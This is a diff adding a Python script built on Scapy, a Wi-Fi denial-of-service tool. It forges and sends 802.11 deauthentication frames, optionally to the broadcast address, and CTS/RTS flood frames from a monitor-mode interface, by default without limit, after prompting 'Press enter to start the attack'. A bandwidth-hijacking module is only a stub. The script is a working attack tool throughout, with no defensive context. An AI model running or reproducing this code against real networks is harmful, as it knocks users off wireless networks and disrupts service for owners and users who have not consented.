@@ -1,0 +1,136 @@
+#!/usr/bin/python3
+#
+#	Denial of Service
+#	   -- Scapy --
+#
+from scapy.all import *
+import argparse
+import os
+import sys
+import time
+
+#Argparse format
+class SmartFormatter(argparse.HelpFormatter):
+	def _split_lines(self, text, width):
+		if text.startswith('R|'):
+			return text[2:].splitlines()
+		return argparse.HelpFormatter._split_lines(self, text, width)
+
+#Variables
+source_mac = ""
+destination_mac = ""
+verbose = 0
+sys.tracebacklimit=0
+
+#Argparse
+parser = argparse.ArgumentParser(formatter_class=SmartFormatter)
+parser.add_argument("type", help="R|DoS type:\n"
+"	Supported types are:\n"
+"		ddos: Deauth DoS\n"
+#"		bwhj: Bandwidth Hijacking through CTS frame modification\n"
+#"		mados: Massive auth DoS\n"
+"		crfdos: CTS/RTS Flood DoS\n")
+parser.add_argument("interface", help="R|Interface that will perform the attack (MUST BE IN MONITOR MODE!)")
+parser.add_argument("-s", "--source", help="R|Source MAC address")
+parser.add_argument("-d", "--destination", help="R|Destination MAC address")
+parser.add_argument("-b", "--broadcast", help="R|Set destination address as broadcast (FF:FF:FF:FF:FF:FF)", action="store_true")
+parser.add_argument("-r", "--reason", help="R|Deauth reason (default is 7)", default=7)
+parser.add_argument("-f", "--flood", help="R|Flood packet type. Could be:\n"
+"		RTS (request-to-send): RTS packets followed by <count> CTS packets\n"
+"		CTS (clear-to-send): CTS packets sent by the AP")
+parser.add_argument("-c", "--count", help="Number of packets to sent (default is 0, and 0 = ∞)", default=0)
+parser.add_argument("-v", help="Verbose", action="store_true")
+parser.add_argument("-i", "--interval", help="Interval between packets")
+args = parser.parse_args()
+
+#Arg_check
+intf = args.interface
+
+if args.v is True:
+	verbose = 1
+
+if args.count == 0:
+	counter = int(-1)
+else:
+	counter = int(args.count)
+
+if args.interval is None:
+	interval = float(0.5)
+else:
+	interval = float(args.interval)
+
+source_mac = args.source
+
+if args.broadcast is True:
+	destination_mac = "ff:ff:ff:ff:ff:ff"
+else:
+	destination_mac = args.destination
+
+razon = int(args.reason)
+
+#Functions
+def ddos():
+	deauth = Dot11(type=0,subtype=12,addr1=destination_mac,addr2=source_mac,addr3=source_mac)/Dot11Deauth(reason=razon)
+	packet = RadioTap()/deauth
+	if verbose == 1:
+		if counter != -1:
+			print("[*] Preparing to send %s packets to destination every %s second(s)"% (counter, interval))
+			time.sleep(1)
+			print("")
+			print("[*] Packet created is:")
+			packet.show()
+			print("")
+			input("Press enter to start the attack...")
+		else:
+			print("[*] Preparing to send infinite packets to destination every %s second(s)"% (interval))
+			time.sleep(1)
+			print("")
+			print("[*] Packet created is:")
+			packet.show()
+			print("")
+			input("Press enter to start the attack...")
+	print("")
+	sendp(packet, iface=intf, count=counter, inter=interval, verbose=verbose)
+
+# Massive auth module disabled, theoretically patched
+def crfdos():
+	if args.flood == "RTS" or args.flood == "rts":
+		rts = Dot11(type=1,subtype=11,addr1=destination_mac,addr2=source_mac,addr3=source_mac,ID=32767)
+		packet = RadioTap()/rts
+	elif args.flood == "CTS" or args.flood == "cts":
+		cts = Dot11(type=1,subtype=12,addr1=destination_mac,addr2=source_mac,addr3=source_mac,ID=32767)
+		packet = RadioTap()/cts
+	if verbose == 1:
+		if counter != -1:
+			print("[*] Preparing to send %s packets to destination every %s second(s)"% (counter, interval))
+			time.sleep(1)
+			print("")
+			print("[*] Packet created is:")
+			packet.show()
+			print("")
+			input("Press enter to start the attack...")
+		else:
+			print("[*] Preparing to send infinite packets to destination every %s second(s)"% (interval))
+			time.sleep(1)
+			print("")
+			print("[*] Packet created is:")
+			packet.show()
+			print("")
+			input("Press enter to start the attack...")
+	print("")
+	sendp(packet, iface=intf, count=counter, inter=interval, verbose=verbose)
+
+def bandwidth_hijack():
+	#localizar CTS frame, modificar su tiempo y reenviarlo
+	print("Hola")
+
+#__main__
+if args.type == "ddos":
+	ddos()
+elif args.type == "crfdos":
+	crfdos()
+else:
+	print("This module is not activated yet...")
+	print("Active modules are:")
+	print("    Deauth DoS (ddos)")
+	print("    CTS/RTS Flood DoS (crfdos)")
